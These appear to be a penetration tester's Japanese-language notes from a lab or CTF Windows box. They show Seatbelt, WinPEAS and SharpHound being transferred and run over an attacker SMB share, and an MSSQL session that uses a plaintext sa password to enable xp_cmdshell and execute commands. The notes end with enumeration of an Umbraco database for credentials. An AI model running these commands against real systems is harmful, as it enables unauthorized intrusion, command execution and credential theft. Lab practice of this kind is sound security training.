# Local

## Auto w/ [Seatbelt](https://github.com/GhostPack/Seatbelt)

### 転送・実行

```zsh
# Attacker
mkdir share
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/Seatbelt.exe -O share/Seatbelt.exe
impacket-smbserver -smb2support -username username -password pw share share
```
```powershell
# Target
net use \\<AttackerIP>\share /user:username pw
cp \\<AttackerIP>\share\Seatbelt.exe .
.\Seatbelt.exe -group=all | Tee-Object -FilePath \\<AttackerIP>\share\seatbelt_result.txt
```

### 実行結果抽出

```powershell

```


## Auto w/ [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

### 転送・実行

```zsh
# Attacker
mkdir share
cp /usr/share/peass/winpeas/winPEASx64.exe share/
impacket-smbserver -smb2support -username username -password pw share share
```
```powershell
# Target
cd ~
net use \\<AttackerIP>\share /user:username pw
cp \\<AttackerIP>\share\winPEASx64.exe .
.\winPEASx64.exe | Tee-Object -FilePath \\<AttackerIP>\share\peas_result.txt
```

### 実行結果抽出

```powershell

```

---
---

## Manual

### ユーザー

- SeImpersonatePrivilegeがある
```
PS C:\> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```


---

### システム情報


---

### ネットワーク

- ローカルサービス（おそらくMSSQL）が動作している
```powershell
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
...  
  TCP    0.0.0.0:2994           0.0.0.0:0              LISTENING       2452
...  
  TCP    127.0.0.1:1434         0.0.0.0:0              LISTENING       824
  TCP    127.0.0.1:14148        0.0.0.0:0              LISTENING       2284
  TCP    192.168.141.226:139    0.0.0.0:0              LISTENING       4
  TCP    192.168.141.226:24621  192.168.45.239:56468   ESTABLISHED     2284
  TCP    192.168.141.226:63787  192.168.45.239:443     ESTABLISHED     1668
  TCP    192.168.141.226:63810  20.72.205.209:443      TIME_WAIT       0
  TCP    192.168.141.226:63822  20.106.86.13:443       SYN_SENT        376
  TCP    192.168.141.226:63823  74.178.76.128:443      SYN_SENT        2700
...

PS C:\> ls
...
	inetpub
	Skylark
	SQL2022
```

- sqlへのアクセス試行
```powershell
sqlcmd -U sa -P DeathMarchPac1942 -l 30
```
- →非インタラクティブシェルなので、以下のようにコマンドを都度実行する必要があり

#### MSSQL

```sql
c:\windows\system32\inetsrv>sqlcmd -U sa -P DeathMarchPac1942 -30 -Q "SELECT name FROM sys.databases;"
sqlcmd -U sa -P DeathMarchPac1942 -30 -Q "SELECT name FROM sys.databases;"
Sqlcmd: '-30': Unexpected argument. Enter '-?' for help.

c:\windows\system32\inetsrv>sqlcmd -U sa -P DeathMarchPac1942 -l 30 -Q "SELECT name FROM sys.databases;"
sqlcmd -U sa -P DeathMarchPac1942 -l 30 -Q "SELECT name FROM sys.databases;"
name                                                                                                                            
--------------------------------------------------------------------------------------------------------------------------------
master                                                                                                                          
tempdb                                                                                                                          
model                                                                                                                           
msdb                                                                                                                            
umbraco                                                                                                                         

(5 rows affected)

c:\windows\system32\inetsrv>sqlcmd -U sa -P DeathMarchPac1942 -l 30 -Q "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';"
sqlcmd -U sa -P DeathMarchPac1942 -l 30 -Q "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';"
name                                                                                                                            
--------------------------------------------------------------------------------------------------------------------------------

(0 rows affected)


c:\windows\system32\inetsrv>sqlcmd -U sa -P DeathMarchPac1942 -l 30 -Q "EXECUTE sp_configure 'show advanced options', 1;"
sqlcmd -U sa -P DeathMarchPac1942 -l 30 -Q "EXECUTE sp_configure 'show advanced options', 1;"

??????? 'show advanced options' ? 0 ?? 1 ?????????RECONFIGURE ?????????????????????????

c:\windows\system32\inetsrv>
c:\windows\system32\inetsrv>sqlcmd -U sa -P DeathMarchPac1942 -l 30 -Q "RECONFIGURE;"
sqlcmd -U sa -P DeathMarchPac1942 -l 30 -Q "RECONFIGURE;"

c:\windows\system32\inetsrv>sqlcmd -U sa -P DeathMarchPac1942 -l 30 -Q "EXECUTE sp_configure 'xp_cmdshell', 1;"
sqlcmd -U sa -P DeathMarchPac1942 -l 30 -Q "EXECUTE sp_configure 'xp_cmdshell', 1;"
??????? 'xp_cmdshell' ? 0 ?? 1 ?????????RECONFIGURE ?????????????????????????

c:\windows\system32\inetsrv>sqlcmd -U sa -P DeathMarchPac1942 -l 30 -Q "RECONFIGURE;"
sqlcmd -U sa -P DeathMarchPac1942 -l 30 -Q "RECONFIGURE;"

c:\windows\system32\inetsrv>sqlcmd -U sa -P DeathMarchPac1942 -l 30 -Q "EXECUTE xp_cmdshell 'whoami';"
sqlcmd -U sa -P DeathMarchPac1942 -l 30 -Q "EXECUTE xp_cmdshell 'whoami';"
output                                                                        
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
nt service\mssqlserver                                                        
NULL                                                                          
(2 rows affected)
```

- umbracoは一般的でないので、これを使う
	- 以下テーブル抜粋
```powershell
c:\windows\system32\inetsrv>sqlcmd -U sa -P DeathMarchPac1942 -l 30 -Q "USE umbraco;SELECT table_name FROM information_schema.tables;"

table_name                                                                                                                      
--------------------------------------------------------------------------------------------------------------------------------
umbracoUserGroup2App                                                          
umbracoUserStartNode                                                          
...
umbracoUserLogin                                                
umbracoConsent                                                                
umbracoAudit                                                                  
cmsMember2MemberGroup                                                         

umbracoLogViewerQuery                                                                                                           
umbracoContentVersionCleanupPolicy                                                                                              
umbracoUserGroup2Node                                                         
umbracoUser                                                                   umbracoAccess                                                                 
umbracoExternalLogin                                                          
umbracoExternalLoginToken                                                     
umbracoTwoFactorLogin                                                         
umbracoLock                                                                   
umbracoUserGroup                                                              
umbracoUser2UserGroup                                                         
umbracoUserGroup2NodePermission                                               
```

- 認証情報を探していく
	- 調べた限り、umbracoのパスワードをクラックするのは難しいとのこと
```powershell

```


---

### インストール済みアプリケーション


---

### 実行中のプロセス


---

### PowerShellログ


---

### サービス

- Spoolerは止まっている
```powershell
NT SERVICE\SQLSERVERAGENT                                                                                                       

(5 rows affected)

c:\windows\system32\inetsrv>sc query Spooler
sc query Spooler

SERVICE_NAME: Spooler 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 1  STOPPED 
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

c:\windows\system32\inetsrv>
```

---

### スケジュールタスク


---

### 興味深い情報

#### Skylark

- Development...というフォルダに、`?????.exe`というファイルがある
- ファイルをローカルに転送すると、「売上を分析する.exe」というファイルが見つかるので、中身を表示する
```sh
strings 売上を分析する.exe # 特になし
```
```sh
strings -e l 売上を分析する.exe # 特になし
```
- 機密情報は文字列に存在しない
- DLL hijackingで使用する可能性あり


#### SQL2022

- iisユーザーは Permission denied

#### home

- iisユーザーはPermission denied


---
---

# AD

## Auto w/ BloodHound

```zsh
# Attacker(作成済みのSMB共有を使う)
cp /opt/bloodhound/SharpHound.ps1 share
```
```powershell
# Target
powershell -ep bypass
net use \\<AttackerIP>\share /user:username pw
Import-Module \\<AttackerIP>\share\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory \\<AttackerIP>\share -ZipFileName 'audit.zip'
```